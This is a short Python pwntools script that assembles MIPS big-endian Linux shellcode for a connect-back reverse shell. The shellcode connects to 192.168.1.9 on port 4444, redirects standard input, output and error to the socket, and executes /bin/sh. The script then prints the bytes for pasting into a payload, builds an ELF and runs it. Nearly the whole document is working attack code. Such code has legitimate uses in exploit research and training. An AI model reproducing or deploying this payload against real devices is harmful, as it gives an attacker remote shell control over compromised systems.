# shellcode reverse (connect back)
from pwn import *

context.update(arch='mips', os='linux', bits=32, endian='big')

shellcode = asm('''
        li $t7, -6                      #socket(family, type, protocol)
        nor $t7, $t7, $zero
        addi $a0, $t7, -3
        addi $a1, $t7, -3
        slti $a2, $zero, -1
        li $v0, 4183
        syscall 0x40404

        sw $v0, -4($sp)                 #connect(fd, *sockaddr, addrlen)
        lw $a0, -4($sp)
        li $t7, -3
        nor $t7, $t7, $zero
        sw $t7, -32($sp)

        lui $t6, 0x115c                 #Port:4444 192.168.1.9
        ori $t6, $t6, 0xc0a8
        sw $t6, -28($sp)
        lui $t4,0xfef6
        nor $t4, 0xffff
        sw $t4, -24($sp)

        addiu $a1, $sp, -30
        li $t7, -17
        nor $t7, $t7, $zero
        move $a2, $t7
        li $v0, 4170
        syscall 0x40404

        li $t7, -3                      #dup2 input, output, error
        nor $t7, $t7, $zero
        lw $a0, -4($sp)
dup2_loop:
        move $a1, $t7
        li $v0, 4063
        syscall 0x40404

        li $s0, -1
        addi $t7, $t7, -1
        bne $t7, $s0, dup2_loop

        slti $a2, $zero, -1             #execuve('/bin/sh')
        lui $t7, 0x2f2f
        ori $t7, $t7, 0x6269
        sw $t7, -20($sp)
        lui $t6, 0x6e2f
        ori $t6, $t6, 0x7368
        sw $t6, -16($sp)
        sw $zero, -12($sp)
        addi $a0, $sp, -20
        sw $a0, -8($sp)
        sw $zero, -4($sp)
        addi $a1, $sp, -8
        li $v0, 4011
        syscall 0x40404
        li $v0, 4166

        li $t7, 0x0368                  #sleep()
        addi $t7, $t7, -0x0304
        sw $t7, -0x0402($sp)
        sw $t7, -0x0406($sp)
        la $a0, -0x0406($sp)
        syscall 0x40404
        addi $t4, $t4, 4444
''')


print(''.join([ '\\x{:02x}'.format(ord(x)) for x in shellcode ]))

filename = make_elf(shellcode, extract=False)
print(filename)
p = process(filename)
pause()   # for copy into payload

p.interactive()
